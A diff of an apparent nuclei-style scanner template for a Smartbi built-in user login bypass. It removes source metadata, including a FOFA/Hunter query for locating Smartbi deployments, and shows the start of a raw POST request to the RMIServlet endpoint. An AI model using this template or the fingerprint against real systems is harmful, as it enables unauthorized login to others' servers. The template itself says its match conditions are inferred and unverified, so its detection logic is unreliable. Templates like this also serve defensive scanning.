@@ -3,14 +3,8 @@ info:
   name: Smartbi内置用户登陆绕过漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a50514be03fd6c3879b9a75eb7cf44b5
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: a50514be03fd6c3879b9a75eb7cf44b5
-    fofa: + hunter：`app.name=="SMARTBI 思迈特"`
 http:
 - raw:
   - 'POST /smartbi/vision/RMIServlet HTTP/1.1
